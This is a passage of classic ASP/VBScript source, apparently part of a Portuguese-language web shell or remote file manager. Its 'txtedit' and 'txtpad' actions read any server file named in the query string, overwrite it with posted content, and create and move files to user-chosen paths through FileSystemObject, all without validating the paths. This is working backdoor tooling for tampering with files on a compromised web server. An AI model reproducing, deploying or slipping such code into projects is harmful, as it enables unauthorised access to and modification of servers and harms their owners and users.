			Response.Write "<textarea cols='85' rows='25' name=""content"" wrap=""physical"" >" & Server.HTMLEncode(a.ReadAll) & "</textarea><br>"
			Response.Write "<input type=""hidden"" name=""path"" value=""" & Trim(Request.QueryString("file")) & """>"
			Response.Write "<input type=""submit"" name=""savemethod"" value=""Save"">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=""submit"" name=""savemethod"" value=""Save as""></form>"
			Set a = Nothing
			Set fso = Nothing
		Else
			Select Case Trim(Request.Form("savemethod"))
				Case "Save"
					Set fso = CreateObject("Scripting.FileSystemObject")
					novotexto = Trim(Request.Form("content"))
					novotexto = Split(novotexto,vbCrLf)
					Set objstream = fso.OpenTextFile(Replace(Trim(Request.Form("path")),"|","\"),2)
					For i = 0 To UBound(novotexto)
						objstream.WriteLine(novotexto(i))
					Next
					objstream.Close
					Set objstream = Nothing
					Response.Write "Texto salvo: <b>" & Replace(Trim(Request.Form("path")),"|","\") & "</b>"
				Case "Save as"
					Set fso = CreateObject("Scripting.FileSystemObject")
					novotexto = Trim(Request.Form("content"))
					novotexto = Split(novotexto,vbCrLf)
					caminho = showobjpath(Replace(Trim(Request.Form("path")),"|","\")) & "rhtemptxt.txt"
					Set objstream = fso.CreateTextFile(caminho,true,false)
					For i = 0 To UBound(novotexto)
						objstream.WriteLine(novotexto(i))
					Next
					objstream.Close
					Set objstream = Nothing
					Response.Write "<form method=""post"" action=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=txtedit"">"
					Response.Write "<input type=""text"" name=""filename"" value=""" & showobj(Replace(Trim(Request.Form("path")),"|","\")) & """><br>"
					Response.Write "<input type=""hidden"" name=""path"" value=""" & Trim(Request.Form("path")) & """>"
					Response.Write "<input type=""submit"" name=""savemethod2"" value=""Save""></form>"
				Case Else
					caminho = showobjpath(Replace(Trim(Request.Form("path")),"|","\")) & "rhtemptxt.txt"
					Set ObjFSO = CreateObject("Scripting.FileSystemObject")
					Set MyFile = ObjFSO.GetFile(caminho)
					destino = Left(caminho,InStrRev(caminho,"\")) & Trim(Request.Form("filename"))
					MyFile.Move (destino)
					If Err.Number = 0 Then
						Response.Write "<font face='arial' size='2'><center><br><br>Arquivo: <b>" & destino & "</b> salvo!"
					End If	
			End Select
		End If
	Case "txtpad"
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		If Request.Form.Count = 0 Then
			Response.Write "<form method=""post"" action=""" & Request.ServerVariables("SCRIPT_NAME") & "?action=txtedit"">"
			Response.Write "<textarea cols='85' rows='25' name=""content"" wrap=""physical"" >" & Server.HTMLEncode(a.ReadAll) & "</textarea><br>"
			Response.Write "<input type=""hidden"" name=""path"" value=""" & Trim(Request.QueryString("file")) & """>"
			Response.Write "<input type=""submit"" name=""savemethod"" value=""Save"">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=""submit"" name=""savemethod"" value=""Save as""></form>"
		Else
			Select Case Trim(Request.Form("savemethod"))
				Case "Save"
					Set fso = CreateObject("Scripting.FileSystemObject")
					novotexto = Trim(Request.Form("content"))
					novotexto = Split(novotexto,vbCrLf)
					Set objstream = fso.OpenTextFile(Replace(Trim(Request.Form("path")),"|","\"),2)
					For i = 0 To UBound(novotexto)
						objstream.WriteLine(novotexto(i))
					Next
					objstream.Close
					Set objstream = Nothing
					Response.Write "Texto salvo: <b>" & Replace(Trim(Request.Form("path")),"|","\") & "</b>"
				Case "Save as"
					Response.Write "Save as"
			End Select
		End If
	Case Else
		checa = checking(cprthtml,keydec)
		Call hdr()
		Response.Write copyright & onlinehelp
		Call showcontent()
End Select
If Err.Number <> 0 Then
	Response.Write "<br><font face='arial' size='2'>ERRO: " & Err.Number & "<br><br><b>" & UCase(Err.Description) & "</b><br>Acesse o <b>ONLINE HELP</b> para a explicação do erro"
End If
Response.Write endcode
%>